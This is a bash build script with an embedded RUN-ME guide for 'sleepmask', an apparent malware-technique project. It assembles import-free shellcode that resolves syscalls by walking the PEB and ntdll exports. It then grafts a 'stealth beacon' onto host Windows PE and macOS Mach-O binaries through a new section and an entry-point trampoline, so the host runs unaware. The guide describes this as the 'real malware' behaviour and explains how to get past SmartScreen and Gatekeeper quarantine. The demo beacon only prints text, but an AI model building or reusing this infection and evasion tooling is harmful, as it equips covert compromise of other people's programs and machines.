#!/usr/bin/env bash
# make_native_test.sh — produce the run-on-real-hardware test bundle.
#
# Builds four harmless, self-contained test binaries and stages them with a
# RUN-ME note in build/native-test/. That folder is the thing to copy onto a
# machine and run:
#
#   probe_windows.exe   standalone, Windows: does the PEB-walk / runtime
#                       syscall-resolution chain work on a real loader?
#   sleepmask_macho     standalone, macOS: does the XNU beacon payload run?
#   inject_win.exe      REAL injection, Windows: a beacon grafted onto a host
#                       PE — the beacon fires first, then the host continues
#                       with its own code and its own exit status.
#   inject_macos        REAL injection, macOS: the same, grafted onto a host
#                       Mach-O.
#   RUN-ME.txt          how to run each + expected output + what to send back
#
# Run from anywhere:  bash tools/make_native_test.sh
set -euo pipefail
cd "$(dirname "$0")/.."
PY="micromamba run -n mdev python"

rm -rf build/native-test
mkdir -p build/native-test

echo "== assemble all PIC blobs (nasm -f bin)"
bash build.sh

echo
echo "== standalone probes (does the resolve-at-runtime chain work?)"
$PY tools/mk_pe.py build/probe_windows.bin build/probe_windows.exe --console
$PY tools/mk_macho.py build/sleepmask_macho

echo
echo "== real-injection demos (beacon grafted onto a host, host continues)"
# Windows: build a CONSOLE-subsystem host PE so its stdout is visible in a
# terminal, then graft the stealth beacon onto it.
$PY tools/mk_pe.py build/host_win.bin build/host_win_console.exe --console
$PY tools/append_pe.py build/host_win_console.exe build/beacon_windows.bin \
    build/native-test/inject_win.exe
# macOS: wrap the host blob in a Mach-O, then graft the beacon.
$PY tools/mk_macho.py build/host_macos.macho build/host_macos.bin
$PY tools/append_macho.py build/host_macos.macho build/beacon_macos.bin \
    build/native-test/inject_macos

echo
echo "== stage the standalone probes into the bundle"
cp -p build/probe_windows.exe build/native-test/probe_windows.exe
cp -p build/sleepmask_macho build/native-test/sleepmask_macho
chmod +x build/native-test/inject_macos

cat > build/native-test/RUN-ME.txt <<'RUNME'
sleepmask — native test bundle
==============================
Harmless, self-contained test binaries to run on your own machine and see
whether the position-independent, zero-import, resolve-everything-at-runtime
shellcode concept actually works against a real OS loader. Nothing here
touches the network or any other process. There are two kinds of binary:

  STANDALONE PROBE   proves the core trick: the blob finds its own syscall
                     numbers by walking the live loader state at runtime
                     (PEB -> ntdll exports on Windows; XNU class tags on
                     macOS), with no import table and no hard-coded numbers.

  REAL INJECTION     proves the "malware" part: a stealth beacon is grafted
                     into an ordinary host program. When you run the host, the
                     beacon fires FIRST, then the host runs its own code and
                     exits with its own status — the host never knows.

WHAT IS IN HERE
---------------
  probe_windows.exe   standalone probe, Windows 11 x64
  sleepmask_macho     standalone probe, macOS x86-64 (Rosetta on Apple Silicon)
  inject_win.exe      injection demo, Windows 11 x64 (console)
  inject_macos        injection demo, macOS x86-64
  RUN-ME.txt          this file

--------------------------------------------------------------------
1. STANDALONE PROBES — "does the resolve-at-runtime chain work?"
--------------------------------------------------------------------
Windows 11 (x64):
  1. Open a terminal in this folder.
  2. Run:   .\probe_windows.exe
  3. Expected on stdout, then exit code 0:

       sleepmask probe - windows x64 (pic, no imports)
       ntdll base: 0x...
       NtTerminateCurrentProcessEx: 0x...
       NtWriteFile: 0x...
       NtCreateFile: 0x...
       NtClose: 0x...
       created sleepmask_probe.txt: 0x0000000000000000
       done - exit 0

     It also writes sleepmask_probe.txt next to itself. SmartScreen may flag
     the unsigned exe -> "More info" -> "Run anyway".

macOS (Intel x86-64; Apple Silicon under Rosetta):
  1. In a terminal:   chmod +x sleepmask_macho
  2. Run:             ./sleepmask_macho
  3. Expected on stdout, then exit code 0:

       sleepmask: armed | macos x86-64 | self-injected

--------------------------------------------------------------------
2. REAL INJECTION — "watch the beacon fire, then the host continue"
--------------------------------------------------------------------
Run these from a terminal. Both should print TWO lines and exit 42:
  line 1 = the grafted beacon (fired first),
  line 2 = "host alive" (the host's own code, running after the beacon),
  exit    = 42 (the host's own status, preserved through the beacon).

Windows 11 (x64):
  1. Run:   .\inject_win.exe
  2. Expected:

       sleepmask: coupled | windows x86-64 | host continues
       host alive

     Then check the exit code:   echo %ERRORLEVEL%     (or: echo $LASTEXITCODE)
     -> should be 42.

macOS (Intel x86-64; Apple Silicon under Rosetta):
  1. In a terminal:   chmod +x inject_macos
  2. Run:             ./inject_macos
  3. Expected:

       sleepmask: coupled | macos x86-64 | host continues
       host alive

     Then:   echo $?     -> should be 42.
     If Gatekeeper quarantines it:
       xattr -d com.apple.quarantine inject_macos
     On Apple Silicon, re-sign ad-hoc:
       codesign -s - --force inject_macos

WHY THIS IS THE PROOF
----------------------
The standalone probe imports nothing: it walks the live PEB -> ntdll.dll
export directory and reads each syscall number out of the export stub
prologues at runtime. If it prints the report and exits 0, the whole
resolve-at-runtime chain worked against the real loader.

The injection demo is the "real malware" behavior: the beacon was appended to
the host as a new section and the host's entry point re-pointed through a
10-byte trampoline. On launch the OS hands control to the trampoline, which
runs the beacon FIRST, then jumps to the host's original entry. The host runs
its own code ("host alive") and exits with its own status (42) — unaware the
beacon ran. The beacon preserved every register the host was holding.

IF IT FAILS / MISFIRES
-----------------------
- Windows: if it faults, the Windows Error Reporting dialog shows the exact
  faulting module offset. Note/screenshot it and send it back.
- Windows: if stdout is empty but the process exited, the report is in
  sleepmask_probe.txt (probe) — for the inject demo, check the exit code
  (42 = it ran correctly even if the console swallowed the text).
- macOS: killed (SIGKILL) before printing is Gatekeeper/signature, not the
  code — try the xattr / codesign lines above.
- Send back: the exact command you ran, the full stdout/stderr, the exit code
  (echo $?), and your OS + architecture.
RUNME

echo
echo "bundle ready in build/native-test/:"
ls -l build/native-test/
echo
echo "copy the whole build/native-test/ folder to the target machine and run"
echo "the binaries per RUN-ME.txt. Send the output back if a step fails."
